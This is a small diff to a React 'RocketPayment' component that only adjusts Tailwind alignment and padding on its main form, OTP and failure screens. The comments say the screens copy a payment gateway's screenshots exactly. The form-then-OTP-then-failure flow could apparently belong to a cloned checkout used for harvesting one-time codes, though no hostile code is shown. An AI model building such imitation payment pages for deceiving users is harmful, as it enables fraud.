@@ -184,7 +184,7 @@ const RocketPayment = () => {
   // OTP Page (matches second screenshot exactly)
   if (showOtp) {
     return (
-    <div className="h-screen bg-[#f0f0f0] flex items-center justify-center px-4 overflow-hidden">
+    <div className="h-screen bg-[#f0f0f0] flex items-start justify-center px-4 pt-4 overflow-hidden">
         <div className="w-full max-w-[700px] bg-white rounded-lg shadow-[0_2px_20px_rgba(0,0,0,0.12)]">
           {header}
           {/* Colored line under header */}
@@ -247,7 +247,7 @@ const RocketPayment = () => {
   // Failed page
   if (showFailed) {
     return (
-      <div className="h-screen bg-[#f0f0f0] flex items-center justify-center px-4 overflow-hidden">
+      <div className="h-screen bg-[#f0f0f0] flex items-start justify-center px-4 pt-4 overflow-hidden">
         <div className="w-full max-w-[700px] bg-white rounded-lg shadow-[0_2px_20px_rgba(0,0,0,0.12)]">
           {header}
           {gatewayBanner}
@@ -266,7 +266,7 @@ const RocketPayment = () => {
 
   // Main form page (matches first screenshot exactly)
   return (
-    <div className="h-screen bg-[#f0f0f0] flex items-center justify-center px-4 overflow-hidden">
+    <div className="h-screen bg-[#f0f0f0] flex items-start justify-center px-4 pt-4 overflow-hidden">
       <div className="w-full max-w-[700px] bg-white rounded-lg shadow-[0_2px_20px_rgba(0,0,0,0.12)]">
         {header}
         {gatewayBanner}
